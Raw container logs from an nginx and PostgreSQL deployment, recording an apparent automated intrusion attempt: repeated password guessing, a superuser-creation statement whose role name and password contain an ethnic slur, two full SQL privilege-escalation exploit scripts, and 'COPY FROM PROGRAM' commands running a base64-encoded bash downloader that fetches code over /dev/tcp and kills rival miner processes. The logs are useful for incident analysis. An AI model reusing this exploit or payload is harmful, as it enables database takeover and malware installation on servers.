nginx-1  | 176.65.139.66 - - [21/Jun/2026:08:27:00 +0000] "GET / HTTP/1.0" 302 0 "-" "Shodan-Pull/1.0"
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 03:54:56.357 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 03:54:56.363 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 03:54:56.397 UTC [1686] LOG:  database system was interrupted; last known up at 2026-06-21 03:47:34 UTC
db-1     | 2026-06-21 03:54:56.470 UTC [1686] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 03:54:56.477 UTC [1686] LOG:  redo starts at 0/1CB4170
db-1     | 2026-06-21 03:54:56.478 UTC [1686] LOG:  invalid record length at 0/1CB41A8: expected at least 24, got 0
db-1     | 2026-06-21 03:54:56.478 UTC [1686] LOG:  redo done at 0/1CB4170 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 03:54:56.489 UTC [1687] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 03:54:56.516 UTC [1687] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.006 s, sync=0.005 s, total=0.032 s; sync files=2, longest=0.003 s, average=0.003 s; distance=0 kB, estimate=0 kB; lsn=0/1CB41A8, redo lsn=0/1CB41A8
db-1     | 2026-06-21 03:54:56.523 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 03:55:46.004 UTC [1692] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 03:55:46.004 UTC [1692] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:57:18.637 UTC [1693] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:57:18.637 UTC [1693] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 03:57:24.819 UTC [1694] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 03:57:24.819 UTC [1694] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:00:10.057 UTC [1695] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:00:10.057 UTC [1695] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:00:13.421 UTC [1696] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:00:13.421 UTC [1696] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:01:08.131 UTC [1697] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:01:08.131 UTC [1697] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:01:48.598 UTC [1698] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:01:48.598 UTC [1698] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:01:49.110 UTC [1699] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:01:49.110 UTC [1699] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:01:50.349 UTC [1] LOG:  server process (PID 1700) was terminated by signal 9: Killed
db-1     | 2026-06-21 04:01:50.349 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 04:01:50.349 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 04:01:50.352 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 04:01:50.385 UTC [1705] LOG:  database system was interrupted; last known up at 2026-06-21 03:54:56 UTC
db-1     | 2026-06-21 04:01:50.457 UTC [1705] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 04:01:50.462 UTC [1705] LOG:  redo starts at 0/1CB4220
db-1     | 2026-06-21 04:01:50.463 UTC [1705] LOG:  invalid record length at 0/1CB4258: expected at least 24, got 0
db-1     | 2026-06-21 04:01:50.463 UTC [1705] LOG:  redo done at 0/1CB4220 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 04:01:50.470 UTC [1706] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 04:01:50.491 UTC [1706] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.005 s, sync=0.003 s, total=0.025 s; sync files=2, longest=0.002 s, average=0.002 s; distance=0 kB, estimate=0 kB; lsn=0/1CB4258, redo lsn=0/1CB4258
db-1     | 2026-06-21 04:01:50.499 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 04:06:30.507 UTC [1711] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:06:30.507 UTC [1711] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:07:04.590 UTC [1712] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:07:04.590 UTC [1712] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:07:08.732 UTC [1713] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:07:08.732 UTC [1713] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:10:24.470 UTC [1714] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:10:24.470 UTC [1714] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:10:35.568 UTC [1715] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:10:35.568 UTC [1715] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:11:53.484 UTC [1716] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:11:53.484 UTC [1716] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:13:58.289 UTC [1717] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:13:58.289 UTC [1717] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:14:04.167 UTC [1718] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:14:04.167 UTC [1718] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:14:10.842 UTC [1719] ERROR:  role "wog" already exists
db-1     | 2026-06-21 04:14:10.842 UTC [1719] STATEMENT:  CREATE USER wog WITH SUPERUSER PASSWORD 'killallwogs123132';
db-1     | 2026-06-21 04:14:12.363 UTC [1719] ERROR:  syntax error at or near "(" at character 50
db-1     | 2026-06-21 04:14:12.363 UTC [1719] STATEMENT:  GRANT ALL PRIVILEGES ON DATABASE current_database() TO CURRENT_USER;
db-1     | 2026-06-21 04:14:13.105 UTC [1719] ERROR:  syntax error at or near "CONNECT" at character 54
db-1     | 2026-06-21 04:14:13.105 UTC [1719] STATEMENT:  CREATE ROLE r0 LOGIN ;
db-1     |      CREATE DATABASE rdb OWNER r0;
db-1     |      CONNECT rdb r0;
db-1     |
db-1     |      CREATE FUNCTION pwn() RETURNS trigger AS $$
db-1     |      BEGIN
db-1     |          IF current_setting('is_superuser') THEN
db-1     |              RAISE WARNING '-- user % --', current_user;
db-1     |              ALTER USER r0 SUPERUSER;
db-1     |          END IF;
db-1     |          RETURN NEW;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE TABLE t1(i INTEGER);
db-1     |      CREATE CONSTRAINT TRIGGER trig
db-1     |          AFTER INSERT ON t1
db-1     |          INITIALLY DEFERRED
db-1     |          FOR EACH ROW EXECUTE PROCEDURE pwn();
db-1     |
db-1     |      CREATE FUNCTION get_target() RETURNS TEXT AS $$
db-1     |          SELECT format('%I.%I',
db-1     |            pg_my_temp_schema()::regnamespace,
db-1     |            'pg_temp_' || 'mv'::text::regclass::oid
db-1     |          );
db-1     |      $$ LANGUAGE SQL STABLE ;
db-1     |
db-1     |      CREATE TYPE etyp AS ENUM ( 'e' );
db-1     |      CREATE FUNCTION wrap_insert(INTEGER) RETURNS INTEGER LANGUAGE sql AS
db-1     |          $$ INSERT INTO t1 VALUES ($1) RETURNING $1; $$ ;
db-1     |      CREATE FUNCTION evil(etyp) RETURNS INTEGER LANGUAGE sql AS
db-1     |          $$ SELECT wrap_insert(1); $$ IMMUTABLE ;
db-1     |      CREATE CAST (etyp AS INTEGER) WITH FUNCTION evil(etyp) AS IMPLICIT ;
db-1     |
db-1     |      CREATE FUNCTION swap() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN i TO x', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN e TO i', target);
db-1     |            EXECUTE format('ALTER TABLE %s RENAME COLUMN x TO e', target);
db-1     |          END IF;
db-1     |          RETURN 1;
db-1     |      END
db-1     |      $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT swap() AS i, 'e'::etyp as e ;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-21 04:14:13.857 UTC [1719] ERROR:  syntax error at or near "CONNECT" at character 54
db-1     | 2026-06-21 04:14:13.857 UTC [1719] STATEMENT:  CREATE ROLE r0 LOGIN ;
db-1     |      CREATE DATABASE rdb OWNER r0;
db-1     |      CONNECT rdb r0;
db-1     |
db-1     |      CREATE FUNCTION pwn() RETURNS trigger AS $$
db-1     |      BEGIN
db-1     |          IF current_setting('is_superuser') THEN
db-1     |              RAISE WARNING '-- user % --', current_user;
db-1     |              ALTER USER r0 SUPERUSER;
db-1     |          END IF;
db-1     |          DROP VIEW IF EXISTS remove_later;
db-1     |          RETURN NEW;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE TABLE t1(i INTEGER);
db-1     |      CREATE CONSTRAINT TRIGGER trig
db-1     |          AFTER INSERT ON t1
db-1     |          INITIALLY DEFERRED
db-1     |          FOR EACH ROW EXECUTE PROCEDURE pwn();
db-1     |
db-1     |      CREATE FUNCTION get_target() RETURNS TEXT AS $$
db-1     |          SELECT format('%I.%I',
db-1     |            pg_my_temp_schema()::regnamespace,
db-1     |            'pg_temp_' || 'mv'::text::regclass::oid
db-1     |          );
db-1     |      $$ LANGUAGE SQL STABLE ;
db-1     |
db-1     |      CREATE FUNCTION conv() RETURNS SETOF INTEGER AS $$
db-1     |      DECLARE
db-1     |          target TEXT := get_target();
db-1     |      BEGIN
db-1     |          IF to_regclass(target) IS NOT NULL THEN
db-1     |              EXECUTE format('CREATE RULE "_RETURN" AS ON SELECT TO %s DO INSTEAD SELECT attack() AS i, 1 as x', target);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME COLUMN x TO ctid', target);
db-1     |          END IF;
db-1     |          RETURN;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE FUNCTION attack() RETURNS INTEGER AS $$
db-1     |      DECLARE
db-1     |        target TEXT := get_target();
db-1     |      BEGIN
db-1     |          BEGIN
db-1     |              INSERT INTO t1 VALUES (1);
db-1     |              EXECUTE format('ALTER VIEW %s RENAME TO remove_later', target);
db-1     |              EXECUTE format('CREATE TEMP TABLE %s()', target);
db-1     |          EXCEPTION WHEN OTHERS THEN -- do nothing
db-1     |          END;
db-1     |          RETURN 2;
db-1     |      END $$ LANGUAGE plpgsql;
db-1     |
db-1     |      CREATE MATERIALIZED VIEW mv AS SELECT conv() AS i, 1 AS x;
db-1     |      CREATE UNIQUE INDEX ix_mv_i ON mv (i);
db-1     |
db-1     |      CONNECT rdb postgres;
db-1     |      REFRESH MATERIALIZED VIEW CONCURRENTLY mv;
db-1     | 2026-06-21 04:14:15.411 UTC [1] LOG:  server process (PID 1719) was terminated by signal 9: Killed
db-1     | 2026-06-21 04:14:15.411 UTC [1] DETAIL:  Failed process was running: DROP TABLE IF EXISTS tests; CREATE TABLE tests(cmd_output text); COPY tests FROM PROGRAM 'echo ZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhd
GggPDw8IiQocHJpbnRmICclcycgIiQxIiB8IHNlZCAncyM6Ly8jICM7cyMvIyAjJykiCiAgRE9DPSIvJHBhdGgiCiAgSE9TVD0iJHtzZXJ2ZXIlJToqfSIKICBQT1JUPSIke3NlcnZlciMjKjp9IgogIFsgIiRIT1NUIiA9ICIkUE9SVCIgXSAmJiBQT1JUPTgwCiAgZXhlYyAzPD4vZGV2L3RjcC8kSE9TVC8kU
E9SVAogIHByaW50ZiAiR0VUICVzIEhUVFAvMS4xXHJcbkhvc3Q6ICVzXHJcbkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iICIkRE9DIiAiJEhPU1QiID4mMwogIHdoaWxlIElGUz0gcmVhZCAtciBsaW5lIDwmMzsgZG8KICAgIGxpbmU9JHtsaW5lJSQnXHInfQogICAgWyAteiAiJGxpbmUiIF0gJiYgYnJlY
WsKICBkb25lCiAgY2F0IDwmMwogIGV4ZWMgMz4mLQp9Cgpmb3IgcGlkIGluIC9wcm9jL1swLTldKjsgZG8gcGlkPSR7cGlkIyMqL307IHJlc3VsdD0kKGxzIC1sIC9wcm9jLyRwaWQvZXhlKTsgY2FzZSAkcmVzdWx0IGluICoiL3RtcC9teXNxbCIqfCoiL3RtcC9pbml0Iip8KiIvdG1wL3dhdGNoZG9nIip8KiIvdmFyL1NvZmlhIip8KiJtY3JubGhveSIqfCoicGdfbWVtIip8KiJ4ODYiKnwqIm1lbWZkIip8KiIubWV0YWJhc2UiKnwqImNhdCIqfCoiL3RtcC8uIip8KiIvdG1wLy5yLnJway8iKnwqImphdmF2bTY0Iip8KiJodHRwZCIqfCoi
db-1     | 2026-06-21 04:14:15.411 UTC [1] LOG:  terminating any other active server processes
db-1     | 2026-06-21 04:14:15.414 UTC [1] LOG:  all server processes terminated; reinitializing
db-1     | 2026-06-21 04:14:15.449 UTC [1724] LOG:  database system was interrupted; last known up at 2026-06-21 04:01:50 UTC
db-1     | 2026-06-21 04:14:15.523 UTC [1724] LOG:  database system was not properly shut down; automatic recovery in progress
db-1     | 2026-06-21 04:14:15.528 UTC [1724] LOG:  redo starts at 0/1CB42D0
db-1     | 2026-06-21 04:14:15.529 UTC [1724] LOG:  invalid record length at 0/1CB5170: expected at least 24, got 0
db-1     | 2026-06-21 04:14:15.529 UTC [1724] LOG:  redo done at 0/1CB5138 system usage: CPU: user: 0.00 s, system: 0.00 s, elapsed: 0.00 s
db-1     | 2026-06-21 04:14:15.535 UTC [1725] LOG:  checkpoint starting: end-of-recovery immediate wait
db-1     | 2026-06-21 04:14:15.569 UTC [1725] LOG:  checkpoint complete: wrote 4 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.007 s, sync=0.007 s, total=0.037 s; sync files=3, longest=0.004 s, average=0.003 s; distance=3 kB, estimate=3 kB; lsn=0/1CB5170, redo lsn=0/1CB5170
db-1     | 2026-06-21 04:14:15.576 UTC [1] LOG:  database system is ready to accept connections
db-1     | 2026-06-21 04:17:16.131 UTC [1731] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:17:16.131 UTC [1731] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:17:27.603 UTC [1730] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:17:27.603 UTC [1730] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:17:42.817 UTC [1732] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:17:42.817 UTC [1732] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:22:39.184 UTC [1733] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:22:39.184 UTC [1733] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:24:01.051 UTC [1734] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:24:01.051 UTC [1734] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:24:15.745 UTC [1735] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:24:15.745 UTC [1735] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:28:01.890 UTC [1736] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:28:01.890 UTC [1736] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:30:51.928 UTC [1737] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:30:51.928 UTC [1737] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:31:00.471 UTC [1738] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:31:00.471 UTC [1738] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:33:24.964 UTC [1739] FATAL:  password authentication failed for user "administrator"
db-1     | 2026-06-21 04:33:24.964 UTC [1739] DETAIL:  Role "administrator" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:36:03.167 UTC [1740] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:36:03.167 UTC [1740] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:36:06.339 UTC [1741] FATAL:  password authentication failed for user "postgres"
db-1     | 2026-06-21 04:36:06.339 UTC [1741] DETAIL:  Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:36:24.531 UTC [1742] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:36:24.531 UTC [1742] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:36:25.427 UTC [1743] FATAL:  password authentication failed for user "woglet"
db-1     | 2026-06-21 04:36:25.427 UTC [1743] DETAIL:  Role "woglet" does not exist.
db-1     |      Connection matched file "/var/lib/postgresql/data/pg_hba.conf" line 128: "host all all all scram-sha-256"
db-1     | 2026-06-21 04:36:46.834 UTC [1] LOG:  server process (PID 1744) was terminated by signal 9: Killed
